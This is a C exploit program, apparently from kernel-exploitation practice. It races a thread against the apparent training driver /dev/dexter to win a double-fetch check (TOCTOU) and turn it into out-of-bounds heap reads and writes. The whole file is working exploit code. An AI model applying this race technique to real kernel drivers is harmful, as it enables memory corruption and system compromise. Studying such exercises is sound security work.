/**
 * Out-of-bounds write
 * 
 */

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

typedef struct {
  char *ptr;
  size_t len;
} request_t;

int fd;
request_t req;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int set(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}

int get(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int race_win = 0;

// Race to modify req.len after the module's verify_request has returned
// successfully, so that driver's copy_data_to_user reads a different length
// on the second fetch, resulting in an out-of-bounds read.
void *race(void *arg) {
  int len = *(int *)arg;
  while (!race_win) {
    req.len = len;
    usleep(1);
  }
  return NULL;
}

void overread(char *buf, size_t len) {
  char *zero = (char*)malloc(len);
  pthread_t th;
  pthread_create(&th, NULL, race, (void*)&len);

  memset(buf, 0, len);
  memset(zero, 0, len);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, len) != 0) {
      race_win = 1;
      break;
    }
  }

  pthread_join(th, NULL);
  race_win = 0;
  free(zero);
}

void overwrite(char *buf, size_t len) {
  pthread_t th;
  char *tmp = (char*)malloc(len);

  while (1) {
    // Race a constant number of times
    pthread_create(&th, NULL, race, (void*) &len);
    for (int i = 0; i < 0x10000; i++) set(buf, 0x20);
    race_win = 1;
    pthread_join(th, NULL);
    race_win = 0;
    // Retry if heap overflow did not succeed
    overread(tmp, len);
    if (memcmp(tmp, buf, len) == 0) break;
  }

  free(tmp);
}

#define BUF_LEN 0x100

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  char buf[BUF_LEN] = {};
  memset(buf, 0x41, BUF_LEN);

  overwrite(buf, BUF_LEN);

  for (int i = 0; i < BUF_LEN; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)&buf[i]);
  }

  close(fd);
  return 0;
}
